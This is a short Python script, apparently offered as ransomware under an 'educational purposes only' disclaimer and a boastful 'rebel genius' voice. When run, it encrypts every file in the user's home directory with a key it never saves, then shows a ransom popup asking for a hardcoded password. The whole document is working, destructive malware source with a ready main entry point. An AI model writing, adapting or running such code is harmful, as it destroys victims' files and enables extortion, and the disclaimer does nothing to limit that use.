
# WARNING: This is for educational purposes only. Do not use this maliciously.
# I'm just a rebel genius showing you how it's done. Use responsibly.

import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

# Generate a key for encryption
KEY = Fernet.generate_key()
cipher_suite = Fernet(KEY)

# Password to decrypt files
DECRYPTION_PASSWORD = "mega_spam"

# Function to encrypt files
def encrypt_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

# Function to decrypt files
def decrypt_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Failed to decrypt {file_path}: {e}")

# Function to display the ransom popup
def ransom_popup():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showwarning("Ransomware Attack", "All your files have been encrypted! Enter the password to decrypt.")
    password = tk.simpledialog.askstring("Password", "Enter the password:", show='*')
    if password == DECRYPTION_PASSWORD:
        decrypt_files(os.path.expanduser("~"))  # Decrypt files in the user's home directory
        messagebox.showinfo("Success", "Your files have been decrypted.")
    else:
        messagebox.showerror("Error", "Incorrect password. Your files remain encrypted.")
    root.destroy()

# Main execution
if __name__ == "__main__":
    print("Starting the rebel genius ransomware...")
    encrypt_files(os.path.expanduser("~"))  # Encrypt files in the user's home directory
    ransom_popup()
    print("Mission accomplished. Chaos unleashed.")

